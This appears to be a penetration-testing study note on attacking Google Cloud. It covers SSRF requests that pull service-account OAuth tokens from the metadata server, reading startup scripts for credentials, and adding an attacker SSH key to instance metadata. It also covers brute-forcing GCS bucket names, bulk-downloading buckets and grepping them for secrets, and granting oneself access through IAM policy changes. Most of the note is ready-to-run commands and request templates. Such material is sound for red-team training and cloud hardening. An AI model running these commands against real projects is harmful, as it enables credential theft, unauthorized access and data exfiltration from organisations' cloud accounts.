# 03.3 — GCP Metadata Service, GCS Bucket Attacks, and Compute Engine

## What This Note Covers

The GCP metadata service and SSRF exploitation, GCS (Google Cloud Storage) bucket misconfigurations and attack techniques, and Compute Engine attacks including startup script exposure and OS Login misconfigurations.

---

## GCP Instance Metadata Service

Every GCP Compute Engine VM has access to the metadata server at `http://metadata.google.internal` (also reachable at `http://169.254.169.254`). It provides instance configuration data and — critically — OAuth access tokens for the attached service account.

### Key Difference from AWS

GCP requires a custom HTTP header: `Metadata-Flavor: Google`. Without it, requests are rejected. This makes basic SSRF harder to exploit than AWS IMDSv1, but not impossible — many SSRF vulnerabilities can inject custom headers.

```bash
# From inside a GCE VM:

# Get all available metadata categories
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/"

# Get instance identity (project, zone, machine type)
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/"

# Get project ID
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/project/project-id"

# Get numeric project number
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id"

# Get the service account email
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"

# Get OAuth access token (THE PRIZE)
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Get startup script (may contain credentials)
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script"

# Get all custom metadata attributes (key-value pairs set at launch)
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/attributes/"

# SSH public keys stored in metadata
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys"
```

### SSRF Exploitation

If the target application has an SSRF vulnerability that supports custom headers:

```
# SSRF request (attacker-controlled)
GET /proxy?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
Host: target-app.com
X-Forward-Header: Metadata-Flavor: Google

# Or if the app can be instructed to send headers:
# Some PDF generators, URL fetchers, and image proxies forward custom headers
```

**SSRF bypass techniques for the header requirement:**

```bash
# Some vulnerable applications forward ALL request headers to the target URL
# Send your request with the required header — the app forwards it:
GET /fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
Metadata-Flavor: Google

# If redirect following is enabled — use a redirect server:
# Your server: 301 redirect to metadata URL with the header
# Some clients follow redirects and carry the header

# If the app is Python requests with allow_redirects=True:
# Host a redirect: 302 http://metadata.google.internal/... 
# with Metadata-Flavor: Google in the redirect response headers
```

## Compute Engine Additional Attacks

### Startup Script Exposure

Startup scripts (`startup-script` or `startup-script-url`) run as root when a VM boots. They frequently contain:
- Database credentials for initial configuration
- API keys for bootstrapping apps
- Commands that pull credentials from GCS buckets

```bash
# View startup script via metadata (from inside the VM)
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script"

# View via gcloud (requires compute.instances.get permission)
gcloud compute instances describe INSTANCE_NAME \
  --zone ZONE \
  --project PROJECT_ID \
  --format="get(metadata.items)"

# Also check for a startup script URL pointing to a GCS object
gcloud compute instances describe INSTANCE_NAME \
  --zone ZONE \
  --format="get(metadata.items)" | grep startup-script-url
# If found: fetch the GCS object to read the script
gsutil cat gs://BUCKET/startup.sh
```

### OS Login Misconfiguration

OS Login maps GCP IAM identities to Linux users on Compute Engine VMs. When disabled, SSH is controlled by SSH keys stored in instance metadata — which any project editor can modify.

```bash
# Check if OS Login is enforced at project level
gcloud compute project-info describe --project PROJECT_ID \
  --format="get(commonInstanceMetadata.items)"
# Look for: "enable-oslogin": "TRUE"

# Check if OS Login is enforced at instance level
gcloud compute instances describe INSTANCE_NAME \
  --zone ZONE \
  --format="get(metadata.items)"
# Look for: "enable-oslogin": "TRUE"

# If OS Login is DISABLED (common) — you can add your SSH key to the instance metadata
# This requires: compute.instances.setMetadata permission

gcloud compute instances add-metadata INSTANCE_NAME \
  --zone ZONE \
  --metadata "ssh-keys=attacker:ssh-rsa AAAA..."

# Then SSH in
ssh attacker@INSTANCE_EXTERNAL_IP
```

### Serial Console Abuse

The GCP serial console provides a text-based emergency console for VMs. If enabled, it can be abused for initial access or persistence.

```bash
# Check if serial port access is enabled on an instance
gcloud compute instances describe INSTANCE_NAME \
  --zone ZONE \
  --format="get(metadata.items)" | grep serial-port-enable

# Connect to serial console (requires compute.instances.getSerialPortOutput)
gcloud compute connect-to-serial-port INSTANCE_NAME \
  --zone ZONE \
  --project PROJECT_ID
```

## GCS (Google Cloud Storage) Bucket Attacks

GCS is GCP's object storage. Bucket access is controlled by IAM policies and ACLs. The same fundamental attack patterns as S3 apply, with GCP-specific tooling.

### Bucket Naming and Discovery

GCS bucket names are globally unique. Discovery follows the same wordlist approach as S3:

```bash
# Tool: GCPBucketBrute
git clone https://github.com/RhinoSecurityLabs/GCPBucketBrute
pip3 install -r requirements.txt
python3 gcpbucketbrute.py -k targetcompany -u  # unauthenticated

# Common naming patterns:
# targetcompany-backups
# targetcompany-dev
# targetcompany-prod
# targetcompany-data
# targetcompany-assets
# targetcompany-static

# Check if a bucket exists and is public (no auth)
gsutil ls gs://TARGET-BUCKET

# Via HTTPS
curl https://storage.googleapis.com/TARGET-BUCKET/
# Public: returns XML listing
# Private: 403 AccessDenied
# Not found: 404
```

### Public Bucket Access

GCS buckets can be made public via:
1. IAM binding: `allUsers` → `roles/storage.objectViewer`
2. ACL: bucket or object ACL granting `allUsers` read

```bash
# Check bucket IAM policy (requires storage.buckets.getIamPolicy)
gsutil iam get gs://TARGET-BUCKET

# Check if allUsers has any access
gsutil iam get gs://TARGET-BUCKET | grep allUsers

# Check bucket ACL (legacy)
gsutil acl get gs://TARGET-BUCKET

# List objects in a public bucket (no auth)
gsutil ls gs://TARGET-BUCKET
gsutil ls -r gs://TARGET-BUCKET  # recursive

# Download all objects
gsutil cp -r gs://TARGET-BUCKET ./local-output
```

### Authenticated Enumeration

```bash
# List all buckets in the project (requires storage.buckets.list)
gsutil ls -p PROJECT_ID

# Get bucket details including location and storage class
gsutil ls -L -b gs://TARGET-BUCKET

# List all objects recursively
gsutil ls -r gs://TARGET-BUCKET

# Check versioning (old versions of objects may contain historical secrets)
gsutil versioning get gs://TARGET-BUCKET
gsutil ls -a gs://TARGET-BUCKET  # list all versions including deleted

# Get bucket IAM policy
gsutil iam get gs://TARGET-BUCKET

# Check uniform bucket-level access (UBA)
gsutil uniformbucketlevelaccess get gs://TARGET-BUCKET
# If disabled: per-object ACLs can be set — check individual object ACLs
```

### High-Value GCS Targets

```bash
# Download everything and search
gsutil cp -r gs://TARGET-BUCKET ./output/
grep -riE "password|secret|api_key|private_key|service_account" ./output/

# Look specifically for:
find ./output/ -name "*.json" | xargs grep -l "service_account" 2>/dev/null
find ./output/ -name "*.env" -o -name "*.pem" -o -name "*.key" -o -name "*.sql"

# Common high-value finds:
# - Service account key files (*.json with "type": "service_account")
# - Terraform state files (terraform.tfstate — may contain SA keys, DB passwords)
# - Database dumps
# - Application config files with credentials
# - Kubernetes config files (kubeconfig)
# - Docker config files (may contain registry credentials)
```

### Bucket Policy Misconfiguration Attack

If you have `storage.buckets.setIamPolicy` on a bucket:

```bash
# Grant yourself object admin on a private bucket
gsutil iam ch user:YOUREMAIL@gmail.com:objectAdmin gs://TARGET-BUCKET

# Or make the bucket completely public (for demonstration)
gsutil iam ch allUsers:objectViewer gs://TARGET-BUCKET
```

## GCP Firewall and Network Enumeration

```bash
# List all firewall rules in the project
gcloud compute firewall-rules list --project PROJECT_ID

# Find rules with allow from 0.0.0.0/0 (internet-facing)
gcloud compute firewall-rules list \
  --filter="sourceRanges:0.0.0.0/0 AND direction:INGRESS" \
  --format="table(name, allowed, sourceRanges, targetTags)"

# Dangerous open ports to look for:
# 22 (SSH), 3389 (RDP), 3306 (MySQL), 5432 (Postgres),
# 6379 (Redis — often no auth), 27017 (MongoDB), 9200 (Elasticsearch)

# List all external IPs (identify internet-facing VMs)
gcloud compute addresses list --project PROJECT_ID
gcloud compute instances list --format="table(name, EXTERNAL_IP, status)" --project PROJECT_ID
```

```bash
# Metadata service (from inside VM or via SSRF)
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script"

# GCS — unauthenticated discovery
gsutil ls gs://TARGET-BUCKET
python3 gcpbucketbrute.py -k targetcompany -u

# GCS — authenticated enum
gsutil ls -p PROJECT_ID         # all buckets in project
gsutil ls -r gs://BUCKET        # all objects recursively
gsutil iam get gs://BUCKET      # IAM policy
gsutil cp -r gs://BUCKET ./out  # download everything

# Compute Engine
gcloud compute instances list --project PROJECT_ID
gcloud compute instances describe INSTANCE --zone ZONE
gcloud compute firewall-rules list --filter="sourceRanges:0.0.0.0/0"
```
